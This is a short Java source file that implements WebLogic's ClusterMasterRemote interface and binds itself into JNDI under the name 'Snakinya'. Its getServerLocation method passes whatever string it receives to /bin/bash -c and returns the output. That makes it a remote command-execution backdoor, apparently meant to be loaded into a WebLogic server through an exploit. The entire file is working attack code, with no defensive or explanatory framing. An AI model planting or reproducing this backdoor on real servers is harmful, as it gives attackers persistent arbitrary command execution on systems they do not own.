package com.snakinya.t3impl;

import weblogic.cluster.singleton.ClusterMasterRemote;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

public class RemoteImpl implements ClusterMasterRemote {

    public static void main(String[] args) {
        RemoteImpl remote = new RemoteImpl();
        try {
            Context context = new InitialContext();
            context.rebind("Snakinya",remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void setServerLocation(String cmd, String args) throws RemoteException {

    }


    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            List<String> cmds = new ArrayList<String>();

            cmds.add("/bin/bash");
            cmds.add("-c");
            cmds.add(cmd);

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
